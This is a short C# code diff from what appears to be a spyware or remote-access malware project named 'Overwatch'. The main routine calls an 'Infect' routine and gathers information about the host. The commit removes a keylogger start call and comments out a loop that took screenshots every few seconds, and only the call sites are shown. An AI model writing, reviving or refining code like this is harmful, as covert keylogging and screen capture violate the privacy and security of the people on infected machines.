@@ -18,14 +18,16 @@ namespace Overwatch
                 cChangeLabel.Infect(args);
                 cReceiveInformation info = new cReceiveInformation();
                 info.Overview();
-                cKeylogger.StartKeylogger();
+                info.Add();/*
                 while (true)
                 {
-                    info.ScreenShoot();
-                    System.Threading.Thread.Sleep(15000);
+                    //info.ScreenShoot();
+                    
+                    System.Threading.Thread.Sleep(150);
                 }
+                */
             }
-            catch (Exception ex){ Log.Write(ex.Message+"JOPA", true);}
+            catch (Exception ex){ Log.Write(ex.Message, true);}
         }
     }
 }
